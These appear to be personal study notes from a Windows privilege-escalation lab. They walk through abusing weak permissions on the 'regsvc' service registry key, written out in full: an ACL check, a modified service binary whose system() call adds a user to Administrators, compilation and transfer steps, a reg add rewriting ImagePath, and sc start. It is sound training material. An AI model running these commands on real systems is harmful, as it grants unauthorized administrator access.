
### **Overview**

This method leverages registry permissions and the ability to create a new service that runs with elevated privileges (e.g., adding a user to the local administrators group). The goal is to modify a Windows service registry entry to execute malicious code that escalates privileges.

---

### **Detection Phase: Identifying Vulnerabilities in the Registry**

The first step is to check if the user has write access to the registry key of a system service.

1. **Open PowerShell on the Windows VM**: Open **PowerShell** on the Windows machine.
    
2. **Check registry permissions**: Run the following command to view the **ACL (Access Control List)** of the registry key for a service (in this case, `regsvc`):
    
    ```powershell
    Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
    ```
    
    - **Explanation**: This command checks who has access to modify the `regsvc` service's registry settings.
        
    - **Look for**: If you see **"NT AUTHORITY\INTERACTIVE"** listed with **"FullControl"** permissions, it means that the user can modify this service registry key.
        
![[Pasted image 20250428103250.png]]
---

### **Exploitation Phase: Create and Deploy Malicious Code**

Now that we know the user can modify the registry, the goal is to create a new service (by modifying the registry) that will execute code to escalate privileges (e.g., adding a user to the admin group).

#### **On the Kali VM**:

1. **Copy the source code file to Kali**: You need to copy the `windows_service.c` file from the **Windows VM** to the **Kali VM**.
    
    Example:
    
    ```cmd
    scp C:\Users\User\Desktop\Tools\Source\windows_service.c kali@Kali_IP:/home/kali/
    ```
    
2. **Edit the source code**: Open the `windows_service.c` file in a text editor (e.g., `nano`, `vim`, or any editor of your choice) and find the line with the **`system()`** function.
    
    - **Modify the system call** to this:
        
        ```c
        system("cmd.exe /k net localgroup administrators user /add");
        ```
        
    - **Explanation**: This command will add the user to the **Administrators** group when the service starts, giving the user admin privileges.
        
3. **Compile the file**: After modifying the code, compile the `windows_service.c` file into an executable (`x.exe`).
    
    - Run the following command in the **Kali terminal** to compile the C file:
        
        ```bash
        x86_64-w64-mingw32-gcc windows_service.c -o x.exe
        ```
        
    - **Note**: If the `x86_64-w64-mingw32-gcc` compiler is not installed, you can install it by running:
        
        ```bash
        sudo apt install gcc-mingw-w64
        ```
        
    - This command will create an **executable file (`x.exe`)**.
        
4. **Copy the generated `x.exe` file to the Windows VM**: Transfer the compiled `x.exe` file to the **C:\Temp** folder on the Windows VM.
    
    Example:
    
    ```bash
    scp x.exe user@Windows_IP:/C:/Temp/
    ```
    

---

### **On the Windows VM**:

Now that you have the `x.exe` file on the Windows VM, you can modify the service's registry entry to point to your malicious executable and trigger it.

1. **Place `x.exe` in the Temp folder**:
    
    - Make sure that **x.exe** is placed in `C:\Temp` on the Windows machine (or the location where you transferred it).
        
2. **Modify the registry to execute `x.exe`**: Open a **Command Prompt** and run the following command to modify the registry and tell the `regsvc` service to run `x.exe`:
    
    ```cmd
    reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
    ```
    
    - **Explanation**: This command adds a new **ImagePath** registry value to the `regsvc` service, making the service run `x.exe` (your malicious executable) instead of its usual behavior.
        
    - The **`/f`** flag forces the change without asking for confirmation.
        
3. **Start the `regsvc` service**: Run this command to start the `regsvc` service, which will now run `x.exe`:
    
    ```cmd
    sc start regsvc
    ```
    
    - **Explanation**: This command starts the `regsvc` service, which will now execute the malicious `x.exe` file.
        
4. **Check if the user was added to the Administrators group**: To confirm that the user has been successfully added to the **Administrators** group, run this command:
    
    ```cmd
    net localgroup administrators
    ```
    
    - **Explanation**: This command lists all the users in the **Administrators** group. If the exploit was successful, you should see the target user listed as an administrator.
        

---

### **Summary of the Process**

1. **Detection**: Check if you have **FullControl** permissions over the registry key for the `regsvc` service.
    
2. **Exploitation**:
    
    - Modify a service to run a malicious executable (`x.exe`) that adds the user to the **Administrators** group.
        
    - Compile and transfer the malicious executable to the target machine.
        
3. **Execution**:
    
    - Modify the registry to point to the malicious executable.
        
    - Start the service, which runs the malicious code.
        
    - Confirm that the user is now in the **Administrators** group.
        

---